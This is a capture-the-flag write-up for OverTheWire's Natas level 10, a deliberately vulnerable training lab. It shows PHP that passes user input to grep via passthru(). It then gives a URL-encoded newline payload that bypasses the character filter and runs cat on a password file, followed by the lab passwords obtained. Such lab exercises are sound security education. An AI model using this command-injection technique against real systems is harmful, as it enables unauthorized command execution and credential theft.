# Natas Level 10

> Username: natas10

> Password: EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv

> URL: http://natas10.natas.labs.overthewire.org

## Solution

Entering the URL, we found a search bar like in the previous level. Viewing the source code behind it we found:

```php
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

We see now there is filter on certain characters. So we can't use `/[;|&]/`, but there is a trick, on Linux \n (New line) works like `;`.

We have to encode the \n and space, so it become like this:

```shell
%0acat%20/etc/natas_webpass/natas11
```

```text
VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd
```

